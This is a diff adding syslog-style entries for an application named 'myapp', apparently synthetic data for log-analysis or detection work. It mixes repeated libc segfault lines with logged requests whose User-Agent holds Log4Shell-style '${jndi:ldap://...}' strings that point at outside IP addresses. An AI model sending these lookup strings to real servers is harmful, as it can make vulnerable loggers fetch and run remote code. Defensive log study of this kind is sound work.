@@ -212,3 +212,67 @@ Sep 03 20:20:48	RUfus	myapp[21650]:	segfault at 0 ip 00007f... sp 00007f... erro
 Sep 03 20:29:58	ADM	myapp[20632]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
 Sep 03 20:37:37	archive	myapp[15077]:	Received request with suspicious User-Agent: ${jndi:ldap://197.210.64.133/a}
 Sep 03 20:38:22	LabSZ	myapp[15746]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 04 01:09:12	server	myapp[16409]:	Received request with suspicious User-Agent: ${jndi:ldap://131.103.24.238/a}
+Sep 04 01:19:24	prod1	myapp[29958]:	Received request with suspicious User-Agent: ${jndi:ldap://129.215.17.15/a}
+Sep 04 01:26:25	archive	myapp[18978]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 04 01:29:13	archive	myapp[19041]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 04 01:29:49	LabSZ	myapp[5479]:	Received request with suspicious User-Agent: ${jndi:ldap://131.103.24.238/a}
+Sep 04 01:39:50	ADM	myapp[1010]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 04 01:40:41	testvm	myapp[17260]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 04 01:41:42	testvm	myapp[24998]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 04 01:48:23	server	myapp[21921]:	Received request with suspicious User-Agent: ${jndi:ldap://193.42.109.42/a}
+Sep 05 00:30:59	RUfus	myapp[9662]:	Received request with suspicious User-Agent: ${jndi:ldap://131.103.24.238/a}
+Sep 05 00:31:31	RUfus	myapp[15769]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 05 00:34:07	archive	myapp[2362]:	Received request with suspicious User-Agent: ${jndi:ldap://131.103.24.238/a}
+Sep 05 00:35:05	RUfus	myapp[26527]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:35:52	server	myapp[12835]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 05 00:36:59	prod1	myapp[8465]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:43:15	testvm	myapp[28587]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:45:19	RUfus	myapp[14427]:	Received request with suspicious User-Agent: ${jndi:ldap://129.215.17.15/a}
+Sep 05 00:48:34	RUfus	myapp[13089]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:49:02	server	myapp[9477]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:49:43	server	myapp[29844]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 05 00:51:40	server	myapp[28034]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 00:58:27	testvm	myapp[16398]:	Received request with suspicious User-Agent: ${jndi:ldap://197.210.64.133/a}
+Sep 05 01:01:51	ADM	myapp[4719]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:04:11	server	myapp[26471]:	Received request with suspicious User-Agent: ${jndi:ldap://197.210.64.133/a}
+Sep 05 01:04:38	archive	myapp[27596]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:26:01	testvm	myapp[5231]:	Received request with suspicious User-Agent: ${jndi:ldap://197.210.64.133/a}
+Sep 05 01:32:58	server	myapp[2876]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:35:36	prod1	myapp[23231]:	Received request with suspicious User-Agent: ${jndi:ldap://131.103.24.238/a}
+Sep 05 01:40:42	archive	myapp[13555]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:41:34	prod1	myapp[15640]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 05 01:47:46	server	myapp[10611]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:51:06	prod1	myapp[10233]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 01:52:04	testvm	myapp[8891]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 02:05:50	LabSZ	myapp[1391]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 05 02:07:27	archive	myapp[18868]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 02:08:15	ADM	myapp[6932]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 02:28:24	prod1	myapp[1270]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 02:31:51	ADM	myapp[11179]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 05 02:35:28	RUfus	myapp[11164]:	Received request with suspicious User-Agent: ${jndi:ldap://129.215.17.15/a}
+Sep 05 02:49:39	server	myapp[3987]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 05 03:05:16	testvm	myapp[10009]:	Received request with suspicious User-Agent: ${jndi:ldap://45.33.32.156/a}
+Sep 05 09:18:37	testvm	myapp[29170]:	Received request with suspicious User-Agent: ${jndi:ldap://81.192.87.130/a}
+Sep 05 09:20:20	testvm	myapp[28199]:	Received request with suspicious User-Agent: ${jndi:ldap://27.254.149.199/a}
+Sep 05 09:22:56	testvm	myapp[19837]:	Received request with suspicious User-Agent: ${jndi:ldap://91.224.92.108/a}
+Sep 05 09:26:04	RUfus	myapp[4782]:	Received request with suspicious User-Agent: ${jndi:ldap://103.197.144.1/a}
+Sep 05 09:40:41	RUfus	myapp[20793]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 09:46:07	testvm	myapp[29311]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 09:48:14	testvm	myapp[3636]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 10:03:35	prod1	myapp[1371]:	Received request with suspicious User-Agent: ${jndi:ldap://1.55.33.86/a}
+Sep 05 10:07:57	prod1	myapp[29259]:	Received request with suspicious User-Agent: ${jndi:ldap://129.215.17.15/a}
+Sep 05 10:11:51	archive	myapp[3370]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 10:20:52	ADM	myapp[4768]:	Received request with suspicious User-Agent: ${jndi:ldap://66.240.192.138/a}
+Sep 05 10:44:52	archive	myapp[16161]:	Received request with suspicious User-Agent: ${jndi:ldap://45.79.181.179/a}
+Sep 05 10:46:07	RUfus	myapp[5219]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 10:50:49	RUfus	myapp[4863]:	Received request with suspicious User-Agent: ${jndi:ldap://45.79.181.223/a}
+Sep 05 10:53:17	testvm	myapp[6391]:	Received request with suspicious User-Agent: ${jndi:ldap://34.123.181.51/a}
+Sep 05 10:59:05	RUfus	myapp[26953]:	Received request with suspicious User-Agent: ${jndi:ldap://80.94.95.112/a}
+Sep 05 11:14:17	archive	myapp[9827]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 11:20:20	LabSZ	myapp[13418]:	Received request with suspicious User-Agent: ${jndi:ldap://80.94.95.15/a}
+Sep 05 12:10:53	prod1	myapp[27389]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 12:11:50	testvm	myapp[23015]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 12:24:49	server	myapp[21795]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 12:30:36	archive	myapp[2790]:	segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so
+Sep 05 12:40:31	RUfus	myapp[25853]:	Received request with suspicious User-Agent: ${jndi:ldap://34.123.181.51/a}
